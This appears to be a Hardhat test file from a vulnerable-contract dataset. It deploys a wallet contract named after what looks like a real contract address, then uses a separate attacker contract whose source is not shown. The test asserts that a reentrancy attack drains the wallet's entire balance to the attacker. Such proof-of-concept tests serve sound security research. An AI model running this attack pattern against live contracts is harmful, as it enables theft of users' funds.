const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol", function () {  
    let X_WALLET;
    let x_WALLET;
    let MaliciousContract;
    let maliciousContract;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol:Log");
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy X_WALLET contract with Log address
        X_WALLET = await ethers.getContractFactory("contracts/dataset/reentrancy/0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol:X_WALLET");
        x_WALLET = await X_WALLET.deploy(log.target);
        await x_WALLET.waitForDeployment();
        //await x_WALLET.setLog(log.target); // Set Log address after deployment

        // Deploy MaliciousContract with X_WALLET address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x93c32845fae42c83a70e5f06214c8433665c2ab5_attack.sol:MaliciousContract");
        maliciousContract = await MaliciousContract.deploy(x_WALLET.target);
        
    });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to X_WALLET contract
        await x_WALLET.Put( 1, {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(x_WALLET.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from maliciousContract on X_WALLET contract
        await maliciousContract.deposit({value:  ethers.parseEther("2")});

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(x_WALLET.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 


        // Perform reentrancy attack through MaliciousContract
        await maliciousContract.attack({value:  ethers.parseEther("2")});
        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(x_WALLET.target);
        const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);

        // Verify the attack was successful
        
        // x_WALLET has a drained account
        expect(victimBalance).to.equal(ethers.parseEther("0")); 

        // 5 original balance + 2 from  initial deposit + 2 from CashOut fallback function 
        expect(maliciousContractBalance).to.equal(ethers.parseEther("9"));
        
    });
    });
  